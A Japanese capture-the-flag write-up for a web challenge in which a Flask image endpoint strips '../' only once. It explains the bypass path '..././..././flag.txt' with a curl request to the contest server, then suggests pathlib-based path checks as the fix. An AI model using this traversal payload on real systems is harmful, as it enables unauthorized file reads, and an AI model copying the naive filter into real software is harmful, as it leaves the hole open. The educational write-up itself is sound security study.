# Alpaca Rangers 2

ちゃんと以前の予告通りグリーンとピンクも登場していましたね。

## 問題

アルパカレンジャーが帰ってきた！
```py
@app.get("/member")
def member():
    path = request.args.get("img", "")
    if len(path) == 0:
        img = notfound
    else:
        path = path.replace("../", "") # Prevents directory traversal
        path = "./images/" + path
        try:
            img = open(path, "rb").read()
        except:
            img = notfound

    response = make_response(img)
    response.headers.set('Content-Type', 'image/png')

    return response
```

## 概要

`/member?img=xxx`にアクセスすると、`./images/xxx`のファイルが存在する場合はそのファイルを画像として表示するようになっています。

Dockerfileをみるとカレントディレクトリは`/app`であり、フラグは`/flag.txt`にあることがわかるので、
```
/member?img=../../flag.txt
```
としたいところですが、
```py
        path = path.replace("../", "") # Prevents directory traversal
```
によって`../`が消されてしまうようです。

どうすればフラグを取得できるのでしょうか？

## 方針

一度しかreplaceしていないことに注目する。

## 解法

`../`がダメなら`%2e%2e%2f`かなと思ったけどこれもダメでした。チェック前にデコードされてしまうからですね。

あと`..\`もダメでした。Windows環境でないからでしょうか。

さて、ソースコードの問題のreplaceのところを見ると「ディレクトリトラバーサルを防止する」とわざわざコメントで書いてくれています。ものすごく怪しいです。

このPythonのreplace関数、先頭マッチではないので、`../`が複数含まれている場合はいくつあっても全て削除してしまいます。
```py
path = '../../../../../../flag.txt'
path = path.replace('../', '')
print(path) # flag.txt
```

しかし、再帰的な処理は行わないので、例えばこのように`../`を`../`で挟み込むと、
```py
path = '..././'
path = path.replace('../', '')
print(path) # ../
```
外側の`../`が残ることになります。

これを利用して
```
/member?img=..././..././flag.txt
```
にアクセスすればフラグを読み込んでもらえますが、ブラウザで開こうとすると壊れた画像として表示されてしまいます。

名前を付けて保存してバイナリエディタで開くとか、開発者ツールでレスポンスを見るとか、Wiresharkでパケットを拾うとか、いろいろな方法があると思いますが、ここではcurlコマンドで確認するのが楽かなと思います。
```
curl http://34.170.146.252:25651/member?img=..././..././flag.txt
```

## その他

簡易的には、
```py
        while "../" in path:
            path = path.replace("../", "")
```
のように`../`が無くなるまで消し尽くせば良いような気もしますが、これでもなんとなく不安が残りますよね。

安全にチェックしたいなら`pathlib`の`resolve`等を使って厳密にチェックする必要がありそうですね。
